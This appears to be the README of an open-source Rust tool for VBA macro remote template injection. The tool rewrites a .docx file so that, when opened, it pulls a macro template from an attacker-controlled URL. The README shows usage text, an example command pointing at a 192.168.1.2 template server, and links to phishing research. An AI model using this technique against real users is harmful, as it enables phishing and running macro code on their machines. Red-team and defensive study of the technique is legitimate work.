# remote-template-injector
VBA Macro Remote Template Injection written in Rust

## Usage

```
❯ remote-template-injector -h

VBA Macro Remote Template Injection written in Rust

Usage: remote-template-injector --url <URL> --file <FILE> --output <OUTPUT>

Options:
  -u, --url <URL>        Template URL
  -f, --file <FILE>      File to be injected
  -o, --output <OUTPUT>  Output location of modified docx file
  -h, --help             Print help
  -V, --version          Print version
```

## Example

```
❯ remote-template-injector -f /path/to/file.docx -u http://192.168.1.2/template.dot -o /path/to/output.docx
Editing remote template url...
Word successfully injected. Generated file: /path/to/output.docx
Good Luck!
```

## Demo

![](https://i.imgur.com/KVif6Ar.gif)

## References
- https://john-woodman.com/research/vba-macro-remote-template-injection/
- https://blog.sunggwanchoi.com/remote-template-injection/
- https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros

## License

MIT License